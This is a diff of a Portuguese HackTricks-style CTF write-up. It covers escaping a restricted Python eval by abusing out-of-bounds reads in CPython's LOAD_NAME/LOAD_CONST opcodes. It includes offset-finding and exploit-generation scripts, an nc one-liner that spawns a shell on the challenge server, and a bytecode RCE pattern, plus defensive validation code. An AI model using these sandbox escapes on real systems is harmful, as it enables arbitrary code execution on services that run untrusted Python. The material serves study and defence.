@@ -2,32 +2,32 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Esta informação foi retirada** [**deste relatório**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
+**Estas informações foram obtidas** [**deste writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**<sup>[[1]](#references)</sup>
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-Podemos usar o recurso de leitura OOB no opcode LOAD_NAME / LOAD_CONST para obter algum símbolo na memória. O que significa usar truques como `(a, b, c, ... centenas de símbolos ..., __getattribute__) if [] else [].__getattribute__(...)` para obter um símbolo (como o nome de uma função) que você deseja.
+Podemos usar o recurso de leitura OOB no opcode LOAD_NAME / LOAD_CONST para obter algum símbolo na memória. Isso significa usar um truque como `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` para obter um símbolo (como o nome de uma função) que você deseja.
 
-Então, basta elaborar seu exploit.
+Em seguida, basta criar seu exploit.
 
-### Overview <a href="#overview-1" id="overview-1"></a>
+### Visão geral <a href="#overview-1" id="overview-1"></a>
 
-O código-fonte é bem curto, contém apenas 4 linhas!
+O código-fonte é bastante curto e contém apenas 4 linhas!
 ```python
 source = input('>>> ')
 if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))1234
 ```
-Você pode inserir código Python arbitrário, e ele será compilado em um [objeto de código Python](https://docs.python.org/3/c-api/code.html). No entanto, `co_consts` e `co_names` desse objeto de código serão substituídos por uma tupla vazia antes de avaliar esse objeto de código.
+Você pode inserir código Python arbitrário, que será compilado em um [Python code object](https://docs.python.org/3/c-api/code.html). No entanto, `co_consts` e `co_names` desse code object serão substituídos por uma tupla vazia antes de esse code object ser avaliado.
 
-Dessa forma, todas as expressões que contêm constantes (por exemplo, números, strings etc.) ou nomes (por exemplo, variáveis, funções) podem causar falha de segmentação no final.
+Dessa forma, todas as expressões que contêm consts (por exemplo, números, strings etc.) ou names (por exemplo, variáveis, funções) podem causar um segmentation fault no final.
 
-### Leitura Fora dos Limites <a href="#out-of-bound-read" id="out-of-bound-read"></a>
+### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
-Como a falha de segmentação acontece?
+Como o segfault acontece?
 
-Vamos começar com um exemplo simples, `[a, b, c]` pode ser compilado no seguinte bytecode.
+Vamos começar com um exemplo simples: `[a, b, c]` poderia ser compilado no seguinte bytecode.
 ```
 1           0 LOAD_NAME                0 (a)
 2 LOAD_NAME                1 (b)
@@ -35,11 +35,11 @@ Vamos começar com um exemplo simples, `[a, b, c]` pode ser compilado no seguint
 6 BUILD_LIST               3
 8 RETURN_VALUE12345
 ```
-Mas e se o `co_names` se tornar uma tupla vazia? O opcode `LOAD_NAME 2` ainda é executado e tenta ler o valor daquele endereço de memória que originalmente deveria estar. Sim, isso é um recurso de leitura fora dos limites.
+Mas e se o `co_names` se tornar uma tupla vazia? O opcode `LOAD_NAME 2` ainda será executado e tentará ler o valor do endereço de memória onde ele originalmente deveria estar. Sim, isso é uma "feature" de leitura fora dos limites (out-of-bound read).
 
-O conceito central para a solução é simples. Alguns opcodes no CPython, por exemplo, `LOAD_NAME` e `LOAD_CONST`, são vulneráveis (?) a leitura fora dos limites.
+O conceito central da solução é simples. Alguns opcodes do CPython, como `LOAD_NAME` e `LOAD_CONST`, são vulneráveis (?) a OOB read.
 
-Eles recuperam um objeto do índice `oparg` da tupla `consts` ou `names` (é assim que `co_consts` e `co_names` são chamados internamente). Podemos nos referir ao seguinte pequeno trecho sobre `LOAD_CONST` para ver o que o CPython faz quando processa o opcode `LOAD_CONST`.
+Eles recuperam um objeto do índice `oparg` da tupla `consts` ou `names` (é assim que `co_consts` e `co_names` são nomeados internamente). Podemos consultar o seguinte pequeno snippest sobre `LOAD_CONST` para ver o que o CPython faz ao processar o opcode `LOAD_CONST`.
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -49,21 +49,21 @@ PUSH(value);
 FAST_DISPATCH();
 }1234567
 ```
-Dessa forma, podemos usar o recurso OOB para obter um "nome" de um deslocamento de memória arbitrário. Para ter certeza de qual nome ele tem e qual é seu deslocamento, basta continuar tentando `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... E você pode encontrar algo em torno de oparg > 700. Você também pode tentar usar gdb para dar uma olhada na disposição da memória, é claro, mas eu não acho que seria mais fácil?
+Dessa forma, podemos usar o recurso OOB para obter um "name" de um offset arbitrário da memória. Para garantir qual name ele possui e qual é seu offset, basta continuar tentando `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... E você poderá encontrar algo em torno de oparg > 700. Você também pode tentar usar o gdb para examinar o layout da memória, é claro, mas não acho que isso seria mais fácil?
 
 ### Gerando o Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-Uma vez que recuperamos esses deslocamentos úteis para nomes / consts, como _fazemos_ para obter um nome / const desse deslocamento e usá-lo? Aqui está um truque para você:\
-Vamos supor que podemos obter um nome `__getattribute__` do deslocamento 5 (`LOAD_NAME 5`) com `co_names=()`, então basta fazer o seguinte:
+Depois de recuperarmos esses offsets úteis para names / consts, como _obtemos_ um name / const a partir desse offset e o utilizamos? Aqui está um truque para você:\
+Vamos supor que possamos obter um name `__getattribute__` a partir do offset 5 (`LOAD_NAME 5`) com `co_names=()`. Nesse caso, basta fazer o seguinte:
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]1234
 ```
-> Observe que não é necessário nomeá-lo como `__getattribute__`, você pode nomeá-lo como algo mais curto ou mais estranho
+> Observe que não é necessário nomeá-lo como `__getattribute__`; você pode nomeá-lo com algo mais curto ou mais estranho
 
-Você pode entender a razão por trás disso apenas visualizando seu bytecode:
+Você pode entender o motivo apenas visualizando seu bytecode:
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -80,7 +80,7 @@ Você pode entender a razão por trás disso apenas visualizando seu bytecode:
 24 BUILD_LIST               1
 26 RETURN_VALUE1234567891011121314
 ```
-Observe que `LOAD_ATTR` também recupera o nome de `co_names`. O Python carrega nomes do mesmo deslocamento se o nome for o mesmo, então o segundo `__getattribute__` ainda é carregado do offset=5. Usando esse recurso, podemos usar um nome arbitrário uma vez que o nome esteja na memória próxima.
+Observe que `LOAD_ATTR` também recupera o nome de `co_names`. O Python carrega nomes a partir do mesmo offset quando o nome é igual, portanto o segundo `__getattribute__` ainda é carregado a partir de offset=5. Usando esse recurso, podemos usar qualquer nome assim que ele estiver na memória próxima.
 
 Para gerar números, deve ser trivial:
 
@@ -91,9 +91,9 @@ Para gerar números, deve ser trivial:
 
 ### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-Eu não usei consts devido ao limite de comprimento.
+Não usei consts devido ao limite de comprimento.
 
-Primeiro, aqui está um script para encontrarmos esses offsets de nomes.
+Primeiro, aqui está um script para encontrarmos esses offsets dos nomes.
 ```python
 from types import CodeType
 from opcode import opmap
@@ -128,7 +128,7 @@ print(f'{n}: {ret}')
 
 # for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
 ```
-E o seguinte é para gerar o verdadeiro exploit em Python.
+E o seguinte é para gerar o exploit real em Python.
 ```python
 import sys
 import unicodedata
@@ -205,7 +205,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-Basicamente, ele faz as seguintes coisas, para aquelas strings que obtemos do método `__dir__`:
+Ele basicamente faz as seguintes coisas; para essas strings, nós as obtemos do método `__dir__`:
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -222,16 +222,16 @@ builtins['eval'](builtins['input']())
 
 ### Notas de versão e opcodes afetados (Python 3.11–3.13)
 
-- Os opcodes de bytecode do CPython ainda indexam as tuplas `co_consts` e `co_names` por operandos inteiros. Se um atacante conseguir forçar essas tuplas a ficarem vazias (ou menores do que o índice máximo usado pelo bytecode), o interpretador lerá a memória fora dos limites para esse índice, resultando em um ponteiro PyObject arbitrário da memória próxima. Os opcodes relevantes incluem pelo menos:
+- Os opcodes de bytecode do CPython ainda indexam as tuplas `co_consts` e `co_names` usando operandos inteiros. Se um atacante puder forçar essas tuplas a ficarem vazias (ou menores que o índice máximo usado pelo bytecode), o interpretador lerá memória fora dos limites para esse índice, obtendo um ponteiro PyObject arbitrário da memória próxima. Os opcodes relevantes incluem pelo menos:
 - `LOAD_CONST consti` → lê `co_consts[consti]`.
-- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → lê nomes de `co_names[...]` (para 3.11+ note que `LOAD_ATTR`/`LOAD_GLOBAL` armazena bits de flag no bit baixo; o índice real é `namei >> 1`). Consulte a documentação do desassemblador para a semântica exata por versão. [Python dis docs].
-- O Python 3.11+ introduziu caches adaptativos/inline que adicionam entradas `CACHE` ocultas entre instruções. Isso não muda o primitivo OOB; significa apenas que, se você criar bytecode manualmente, deve levar em conta essas entradas de cache ao construir `co_code`.
+- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → leem nomes de `co_names[...]` (para 3.11+, observe que `LOAD_ATTR`/`LOAD_GLOBAL` armazenam bits de flag no bit menos significativo; o índice real é `namei >> 1`). Consulte a documentação do disassembler para obter a semântica exata de cada versão. [Python dis docs].<sup>[[2]](#references)</sup>
+- O Python 3.11+ introduziu caches adaptativos/inline que adicionam entradas `CACHE` ocultas entre as instruções. Isso não altera a primitiva OOB; apenas significa que, se você criar bytecode manualmente, deverá levar essas entradas de cache em consideração ao construir `co_code`.
 
-Implicação prática: a técnica nesta página continua a funcionar no CPython 3.11, 3.12 e 3.13 quando você pode controlar um objeto de código (por exemplo, via `CodeType.replace(...)`) e reduzir `co_consts`/`co_names`.
+Implicação prática: a técnica nesta página continua funcionando no CPython 3.11, 3.12 e 3.13 quando você consegue controlar um code object (por exemplo, via `CodeType.replace(...)`) e reduzir `co_consts`/`co_names`.
 
 ### Scanner rápido para índices OOB úteis (compatível com 3.11+/3.12+)
 
-Se você preferir sondar objetos interessantes diretamente do bytecode em vez de a partir de código-fonte de alto nível, pode gerar objetos de código mínimos e forçar índices. O auxiliar abaixo insere automaticamente caches inline quando necessário.
+Se preferir procurar objetos interessantes diretamente a partir do bytecode, em vez de usar código-fonte de alto nível, você pode gerar code objects mínimos e testar índices por força bruta. O helper abaixo insere automaticamente os inline caches quando necessário.
 ```python
 import dis, types
 
@@ -271,12 +271,12 @@ if obj is not None:
 print(idx, type(obj), repr(obj)[:80])
 ```
 Notas
-- Para sondar nomes em vez disso, troque `LOAD_CONST` por `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` e ajuste o uso da pilha de acordo.
-- Use `EXTENDED_ARG` ou múltiplos bytes de `arg` para alcançar índices >255, se necessário. Ao construir com `dis` como acima, você controla apenas o byte baixo; para índices maiores, construa os bytes brutos você mesmo ou divida o ataque em múltiplos loads.
+- Para sondar names em vez disso, troque `LOAD_CONST` por `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` e ajuste o uso da stack de acordo.
+- Use `EXTENDED_ARG` ou múltiplos bytes de `arg` para alcançar índices >255, se necessário. Ao construir com `dis` como acima, você controla apenas o byte inferior; para índices maiores, construa os bytes brutos manualmente ou divida o ataque entre vários loads.
 
 ### Padrão mínimo de RCE apenas com bytecode (co_consts OOB → builtins → eval/input)
 
-Uma vez que você tenha identificado um índice `co_consts` que resolve para o módulo builtins, você pode reconstruir `eval(input())` sem nenhum `co_names` manipulando a pilha:
+Depois de identificar um índice de `co_consts` que resolve para o módulo builtins, você pode reconstruir `eval(input())` sem nenhum `co_names`, manipulando a stack:
 ```python
 # Build co_code that:
 # 1) LOAD_CONST <builtins_idx> → push builtins module
@@ -285,11 +285,11 @@ Uma vez que você tenha identificado um índice `co_consts` que resolve para o m
 # 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
 # This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
 ```
-Essa abordagem é útil em desafios que lhe dão controle direto sobre `co_code` enquanto forçam `co_consts=()` e `co_names=()` (por exemplo, BCTF 2024 “awpcode”). Ela evita truques em nível de fonte e mantém o tamanho do payload pequeno aproveitando operações de pilha de bytecode e construtores de tuplas.
+Essa abordagem é útil em challenges que fornecem controle direto sobre `co_code` enquanto forçam `co_consts=()` e `co_names=()` (por exemplo, “awpcode” do BCTF 2024). Ela evita tricks no nível do source e mantém o tamanho do payload pequeno ao aproveitar bytecode stack ops e tuple builders.
 
-### Verificações defensivas e mitigação para sandboxes
+### Verificações defensivas e mitigações para sandboxes
 
-Se você está escrevendo um “sandbox” em Python que compila/avalia código não confiável ou manipula objetos de código, não confie no CPython para verificar os limites dos índices de tupla usados pelo bytecode. Em vez disso, valide os objetos de código você mesmo antes de executá-los.
+Se você estiver escrevendo um “sandbox” Python que compila/avalia código não confiável ou manipula code objects, não dependa do CPython para verificar os limites dos índices de tuplas usados pelo bytecode. Em vez disso, valide os code objects por conta própria antes de executá-los.
 
 Validador prático (rejeita acesso OOB a co_consts/co_names)
 ```python
@@ -324,11 +324,12 @@ raise ValueError("Bytecode refers to name index beyond co_names length")
 # eval(c, {'__builtins__': {}})
 ```
 Ideias adicionais de mitigação
-- Não permita `CodeType.replace(...)` arbitrário em entradas não confiáveis, ou adicione verificações estruturais rigorosas no objeto de código resultante.
-- Considere executar código não confiável em um processo separado com sandboxing a nível de SO (seccomp, objetos de trabalho, contêineres) em vez de confiar na semântica do CPython.
+- Não permita `CodeType.replace(...)` arbitrário em input não confiável ou adicione verificações estruturais rigorosas ao code object resultante.
+- Considere executar código não confiável em um processo separado com sandboxing no nível do sistema operacional (seccomp, job objects, containers) em vez de depender da semântica do CPython.
 
 ## Referências
 
-- O writeup do HITCON CTF 2022 da Splitline “V O I D” (origem desta técnica e cadeia de exploração de alto nível): https://blog.splitline.tw/hitcon-ctf-2022/
-- Documentação do desassemblador Python (semântica de índices para LOAD_CONST/LOAD_NAME/etc., e flags de baixo bit `LOAD_ATTR`/`LOAD_GLOBAL` para 3.11+): https://docs.python.org/3.13/library/dis.html
+- [1] [writeup de Splitline sobre o HITCON CTF 2022 "V O I D" (origem desta técnica e exploit chain de alto nível)](https://blog.splitline.tw/hitcon-ctf-2022/)
+- [2] [Documentação do disassembler do Python (semântica dos índices para LOAD_CONST/LOAD_NAME/etc. e flags de low-bit de `LOAD_ATTR`/`LOAD_GLOBAL` no 3.11+)](https://docs.python.org/3.13/library/dis.html)
+
 {{#include ../../../banners/hacktricks-training.md}}
